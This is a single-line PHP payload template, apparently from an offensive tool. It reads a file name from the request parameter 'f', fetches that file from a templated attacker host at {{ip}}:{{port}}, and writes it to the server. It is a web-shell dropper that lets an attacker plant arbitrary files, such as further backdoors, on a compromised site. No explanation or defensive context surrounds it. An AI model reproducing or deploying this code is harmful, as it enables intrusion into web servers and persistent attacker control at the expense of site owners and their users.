<?php if(isset($_REQUEST['f'])) { file_put_contents($_REQUEST['f'], file_get_contents('http://{{ip}}:{{port}}/'.$_REQUEST['f'])); };?> 
